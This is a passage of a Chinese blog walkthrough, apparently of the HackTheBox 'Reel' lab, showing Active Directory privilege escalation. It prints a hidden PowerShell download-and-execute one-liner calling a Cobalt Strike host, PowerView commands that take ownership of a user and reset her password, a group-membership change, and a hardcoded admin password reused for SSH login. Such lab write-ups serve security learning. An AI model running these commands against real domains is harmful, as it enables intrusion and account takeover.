+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stata">tom@REEL C:\Users\tom\Desktop\AD Audit&gt;<span class="hljs-keyword">dir</span>                                                                                      <br> Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.                                                                                                <br> Volume Serial Number is CC8A-33E1                                                                                              <br><br> Directory of C:\Users\tom\Desktop\AD Audit                                                                                     <br><br>05/29/2018  09:02 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .                                                                                        <br>05/29/2018  09:02 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..                                                                                       <br>05/30/2018  12:44 AM    &lt;<span class="hljs-keyword">DIR</span>&gt;          BloodHound                                                                               <br>05/29/2018  09:02 PM               182 <span class="hljs-keyword">note</span>.txt                                                                                 <br>               1 <span class="hljs-keyword">File</span>(s)            182 bytes                                                                                   <br>               3 <span class="hljs-keyword">Dir</span>(s)  15,768,489,984 bytes free                                                                              <br><br>tom@REEL C:\Users\tom\Desktop\AD Audit&gt;<span class="hljs-keyword">type</span> <span class="hljs-keyword">note</span>.txt                                                                            <br>Findings:                                                                                                                       <br>Surprisingly <span class="hljs-keyword">no</span> AD attack paths from user to Domain Admin (using default shortest path <span class="hljs-keyword">query</span>).                                  <br>令人惊讶的是，从用户到Domain Admin没有AD攻击路径(使用默认最短路径查询)。<br>Maybe we should re-<span class="hljs-keyword">run</span> Cypher <span class="hljs-keyword">query</span> against other groups we&#x27;ve created.                   也许我们应该对我们创建的其他组重新运行Cypher查询。      <br>tom@REEL C:\Users\tom\Desktop\AD Audit&gt;    <br></code></pre></td></tr></table></figure>
+
+<p>再往目录深处走，靶场很贴心的为我准备了很多文件：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Directory</span> of C:\Users\tom\Desktop\AD Audit\BloodHound                                     <br><span class="hljs-attribute">05</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">44</span> AM    &lt;DIR&gt;          .                                                 <br><span class="hljs-attribute">05</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">44</span> AM    &lt;DIR&gt;          ..                                                  <span class="hljs-number">05</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">57</span> PM    &lt;DIR&gt;          Ingestors                                         <br><span class="hljs-attribute">10</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM           <span class="hljs-number">769</span>,<span class="hljs-number">587</span> PowerView.ps1                                     <br>               <span class="hljs-attribute">1</span> File(s)        <span class="hljs-number">769</span>,<span class="hljs-number">587</span> bytes                                             <br>               <span class="hljs-attribute">3</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">768</span>,<span class="hljs-number">489</span>,<span class="hljs-number">984</span> bytes free                                       <br><span class="hljs-attribute">tom</span>@REEL C:\Users\tom\Desktop\AD Audit\BloodHound&gt;cd Ingestors                           <br><span class="hljs-attribute">tom</span>@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors&gt;DIR                            Volume in drive C has no label.                                                           Volume Serial Number is CC8A-<span class="hljs-number">33</span>E1                                                         <br><span class="hljs-attribute">Directory</span> of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                            <span class="hljs-number">05</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">57</span> PM    &lt;DIR&gt;          .                                                 <br><span class="hljs-attribute">05</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">57</span> PM    &lt;DIR&gt;          ..                                                  <span class="hljs-number">11</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">12</span>:<span class="hljs-number">50</span> AM           <span class="hljs-number">112</span>,<span class="hljs-number">225</span> acls.csv                                           <br><span class="hljs-attribute">10</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">50</span> PM             <span class="hljs-number">3</span>,<span class="hljs-number">549</span> BloodHound.bin                                     <br><span class="hljs-attribute">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">04</span>:<span class="hljs-number">27</span> PM           <span class="hljs-number">246</span>,<span class="hljs-number">489</span> BloodHound_Old.ps1                                 <br><span class="hljs-attribute">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">04</span>:<span class="hljs-number">27</span> PM           <span class="hljs-number">568</span>,<span class="hljs-number">832</span> SharpHound.exe                                     <br><span class="hljs-attribute">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">04</span>:<span class="hljs-number">27</span> PM           <span class="hljs-number">636</span>,<span class="hljs-number">959</span> SharpHound.ps1                                     <br>               <span class="hljs-attribute">5</span> File(s)      <span class="hljs-number">1</span>,<span class="hljs-number">568</span>,<span class="hljs-number">054</span> bytes                                             <br>               <span class="hljs-attribute">2</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">768</span>,<span class="hljs-number">489</span>,<span class="hljs-number">984</span> bytes free         <br></code></pre></td></tr></table></figure>
+
+<p>为了与目标交互方便，我使用CobaltStrike向Tom进行Web载荷投递，因为我有Tom的终端，Metasploit不知为何失败了：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.9:80/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>我通过CobaltStrike把acls.csv下载了下来，它向我提供了一大堆目标域内用户组的的信息，直接把我人看晕了，然而新版的BloodHound不支持csv格式的解析，但是旧版本1.5.2的可以:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound<span class="hljs-regexp">/releases/</span>tag/<span class="hljs-number">1.5</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220407153021950.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220407153021950" style="zoom:200%;" />
+
+<p>然后我发现了一个Backup_admin的备份组，CLAIRE对其有WriteDacl权限，而Tom对其拥有Owns权。而目标在C:\Users\tom\Desktop\AD Audit\BloodHound为我准备了PowerView。</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">tom@REEL <span class="hljs-name">C</span>:\Users\tom\Desktop\AD Audit\BloodHound&gt;powershell<br>Windows PowerShell<br>Copyright (C) <span class="hljs-number">2014</span> Microsoft Corporation. All rights reserved.<br><br>PS <span class="hljs-name">C</span>:\Users\tom\Desktop\AD Audit\BloodHound&gt; . .\PowerView.ps1<br></code></pre></td></tr></table></figure>
+
+<p>注意” . “ ，一个” . “会因为作用域不同而报错，具体详细说明可以参考微软官方powershell文档：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>powershell<span class="hljs-regexp">/module/mi</span>crosoft.powershell.core<span class="hljs-regexp">/about/</span>about_scripts?view=powershell-<span class="hljs-number">7.2</span><br></code></pre></td></tr></table></figure>
+
+<p>然后，我将Tom设置为 claire 的 ACL 的拥有者：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-DomainObjectOwner <span class="hljs-comment">-identity claire -OwnerIdentity tom</span><br></code></pre></td></tr></table></figure>
+
+<p>我授予Tom更改claire 的 ACL中密码的权限：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword<br></code></pre></td></tr></table></figure>
+
+<p>然后我将创建一个密码凭证对象：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;qwerQWER1234!@#<span class="hljs-variable">$</span>&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-force</span><br></code></pre></td></tr></table></figure>
+
+<p>并将它作为claire的登录密码：</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">Set</span>-DomainUserPassword -identity claire -accountpassword <span class="hljs-built_in">$cred</span><br></code></pre></td></tr></table></figure>
+
+<p>那么我就可以通过SSH以claire身份登录目标系统：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> claire@<span class="hljs-number">10.10.10.77</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">claire<span class="hljs-keyword">@10</span>.10.10.77&#x27;s <span class="hljs-attribute">password</span>:<br>Microsoft Windows [Version <span class="hljs-number">6.3</span>.<span class="hljs-number">9600</span>]<br>(c) <span class="hljs-number">2013</span> Microsoft Corporation. All rights reserved.<br><br>claire@REEL <span class="hljs-attribute">C</span>:\Users\claire&gt;<br></code></pre></td></tr></table></figure>
+
+<p>那么我可以先看一眼Backup_admin备份组的成员用户：</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">backup_admins</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Group</span> <span class="hljs-type">name</span>     Backup_Admins<br><span class="hljs-keyword">Comment</span><br><br>Members<br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>ranj<br>The command completed successfully.<br></code></pre></td></tr></table></figure>
+
+<p>它的成员只有ranj，我可以将claire添加进去：</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">backup_admins</span> claire /add<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Group</span> <span class="hljs-type">name</span>     Backup_Admins<br><span class="hljs-keyword">Comment</span><br><br>Members<br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>claire                   ranj<br>The command completed successfully.<br></code></pre></td></tr></table></figure>
+
+<p>我需要关闭ssh链接并重新登录，然后我可以尝试去访问Administrator目录，我尝试读取root.txt，它不让我读：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Directory</span> of C:\Users\Administrator\Desktop<br><br><span class="hljs-attribute">01</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">02</span>:<span class="hljs-number">56</span> PM    &lt;DIR&gt;          .<br><span class="hljs-attribute">01</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">02</span>:<span class="hljs-number">56</span> PM    &lt;DIR&gt;          ..<br><span class="hljs-attribute">11</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">47</span> PM    &lt;DIR&gt;          Backup Scripts<br><span class="hljs-attribute">10</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">56</span> AM                <span class="hljs-number">32</span> root.txt<br>               <span class="hljs-attribute">1</span> File(s)             <span class="hljs-number">32</span> bytes<br>               <span class="hljs-attribute">3</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">725</span>,<span class="hljs-number">092</span>,<span class="hljs-number">864</span> bytes free<br><br><span class="hljs-attribute">claire</span>@REEL C:\Users\Administrator\Desktop&gt;type root.txt<br><span class="hljs-attribute">Access</span> is denied.<br></code></pre></td></tr></table></figure>
+
+<p>然后我看到它目录中有个Backup Scripts，我进去查看发现了一些备份脚本：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">Directory</span> of C:\Users\Administrator\Desktop\Backup Scripts<br><br><span class="hljs-attribute">11</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">47</span> PM    &lt;DIR&gt;          .<br><span class="hljs-attribute">11</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">47</span> PM    &lt;DIR&gt;          ..<br><span class="hljs-attribute">11</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM               <span class="hljs-number">845</span> backup.ps1<br><span class="hljs-attribute">11</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">37</span> PM               <span class="hljs-number">462</span> backup1.ps1<br><span class="hljs-attribute">11</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">21</span> PM             <span class="hljs-number">5</span>,<span class="hljs-number">642</span> BackupScript.ps1<br><span class="hljs-attribute">11</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">09</span>:<span class="hljs-number">43</span> PM             <span class="hljs-number">2</span>,<span class="hljs-number">791</span> BackupScript.zip<br><span class="hljs-attribute">11</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM             <span class="hljs-number">1</span>,<span class="hljs-number">855</span> folders-system-state.txt<br><span class="hljs-attribute">11</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM               <span class="hljs-number">308</span> test2.ps1.txt<br>               <span class="hljs-attribute">6</span> File(s)         <span class="hljs-number">11</span>,<span class="hljs-number">903</span> bytes<br>               <span class="hljs-attribute">2</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">725</span>,<span class="hljs-number">092</span>,<span class="hljs-number">864</span> bytes free<br></code></pre></td></tr></table></figure>
+
+<p>而在BackupScript.ps1有这样一条信息：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># admin password</span><br>$password=<span class="hljs-string">&quot;Cr4ckMeIfYouC4n!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="拿下权限："><a href="#拿下权限：" class="headerlink" title="拿下权限："></a>拿下权限：</h5><p>我尝试用administrator身份登录并以此作密码：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> administrator@<span class="hljs-number">10.10.10.77</span><br></code></pre></td></tr></table></figure>
+
+<p>我成功了登录了，并且我可以访问到root.txt：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">administrator</span>@REEL C:\Users\Administrator\Desktop&gt;dir<br> <span class="hljs-attribute">Volume</span> in drive C has no label.<br> <span class="hljs-attribute">Volume</span> Serial Number is CC8A-<span class="hljs-number">33</span>E1<br><br> <span class="hljs-attribute">Directory</span> of C:\Users\Administrator\Desktop<br><br><span class="hljs-attribute">21</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">15</span>:<span class="hljs-number">56</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">21</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">15</span>:<span class="hljs-number">56</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">02</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">22</span>:<span class="hljs-number">47</span>    &lt;DIR&gt;          Backup Scripts<br><span class="hljs-attribute">28</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">12</span>:<span class="hljs-number">56</span>                <span class="hljs-number">32</span> root.txt<br>               <span class="hljs-attribute">1</span> File(s)             <span class="hljs-number">32</span> bytes<br>               <span class="hljs-attribute">3</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">757</span>,<span class="hljs-number">074</span>,<span class="hljs-number">432</span> bytes free<br><br><span class="hljs-attribute">administrator</span>@REEL C:\Users\Administrator\Desktop&gt;type root.txt<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Reel</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Reel/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Ransom/" title="HackTheBox-Ransom">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Ransom</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Resolute/" title="HackTheBox-Resolute">
+                        <span class="hidden-mobile">HackTheBox-Resolute</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
